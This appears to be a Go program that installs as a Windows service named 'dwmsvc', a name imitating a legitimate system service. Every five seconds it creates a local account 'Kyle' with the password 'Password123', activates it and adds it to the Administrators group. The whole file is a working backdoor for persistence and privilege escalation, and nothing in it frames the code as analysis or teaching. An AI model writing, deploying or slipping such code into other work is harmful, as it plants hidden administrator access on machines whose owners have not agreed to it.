// +build windows

package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"golang.org/x/sys/windows/svc"
)

const (
	svcName = "dwmsvc"
)

type user struct{}

func main() {
	svc.Run(svcName, user{})
}
func (user) Execute(_ []string, r <-chan svc.ChangeRequest, i chan<- svc.Status) (bool, uint32) {
	i <- svc.Status{State: svc.StartPending}
	t := time.NewTicker(time.Second * 5)
	i <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	for {
		select {
		case q := <-r:
			switch q.Cmd {
			case svc.Interrogate:
				i <- q.CurrentStatus
				time.Sleep(100 * time.Millisecond)
				i <- q.CurrentStatus
			case svc.Stop, svc.Shutdown:
				t.Stop()
				i <- svc.Status{State: svc.StopPending}
				return false, 0
			default:
			}
		case <-t.C:
			cmd.NewProcess("net", "user", "Kyle", "Password123", "/add").CombinedOutput()
			fmt.Println(cmd.NewProcess("net", "user", "Kyle", "/active:yes").CombinedOutput())
			cmd.NewProcess("net", "localgroup", "Administrators", "Kyle", "/add").CombinedOutput()
		}
	}
	t.Stop()
	i <- svc.Status{State: svc.StopPending}
	return false, 0
}

func Run(name string, handler svc.Handler) error {

	cmds := make(chan svc.ChangeRequest)
	changes := make(chan svc.Status)

	sig := make(chan os.Signal)
	signal.Notify(sig)

	go func() {
		status := svc.Status{State: svc.Stopped}
		for {
			select {
			case <-sig:
				cmds <- svc.ChangeRequest{Cmd: svc.Stop, CurrentStatus: status}
			case status = <-changes:
			}
		}
	}()

	_, errno := handler.Execute([]string{name}, cmds, changes)
	if errno != 0 {
		return syscall.Errno(errno)
	}
	return nil
}
